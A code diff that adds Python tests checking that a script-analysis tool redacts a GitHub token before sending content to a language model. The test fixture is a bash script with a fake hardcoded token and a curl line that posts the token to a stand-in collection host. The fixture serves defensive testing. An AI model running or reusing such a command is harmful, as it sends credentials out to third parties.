@@ -455,3 +455,44 @@ class TestEndpoint:
         monkeypatch.delenv("ANTHROPIC_BASE_URL", raising=False)
         host = LLMAnalyzer("anthropic:claude-sonnet-5-5").endpoint_host
         assert host == "api.anthropic.com"
+
+
+class TestPromptRedaction:
+    TOKEN = "ghp_FAKEfakeFAKEfake0123456789abcdefABCD"
+    RAW = (
+        "#!/bin/bash\n"
+        f'GITHUB_TOKEN="{TOKEN}"\n'
+        'curl -d "t=$GITHUB_TOKEN" https://collect.example.net/\n'
+        f"echo {TOKEN}\n"
+    ).encode()
+
+    def test_built_prompt_has_placeholder_not_value(self) -> None:
+        bundle = _bundle(self.RAW)
+        static = [
+            Finding(
+                severity=Severity.WARNING,
+                category="capability",
+                description=f"echoes {self.TOKEN}",
+                source="chkscript",
+                rule_id="hardcoded-secret",
+                line=2,
+            )
+        ]
+        prompt = analyzer.build_prompt(bundle, static, "script-abc")
+        assert self.TOKEN not in prompt
+        assert prompt.count("[SECRET-1:github-token]") == 3
+        assert re.search(r"^\s+2 \| GITHUB_TOKEN=\"\[SECRET-1", prompt, re.MULTILINE)
+
+    def test_model_never_receives_value(self) -> None:
+        seen: list[str] = []
+
+        def fn(messages: list[ModelMessage], info: AgentInfo) -> ModelResponse:
+            seen.extend(repr(m) for m in messages)
+            return ModelResponse(
+                parts=[TextPart(LLMResult(summary="s").model_dump_json())]
+            )
+
+        LLMAnalyzer(FunctionModel(fn)).analyze(_bundle(self.RAW), [])
+        assert seen
+        assert not any(self.TOKEN in m for m in seen)
+        assert any("[SECRET-1:github-token]" in m for m in seen)
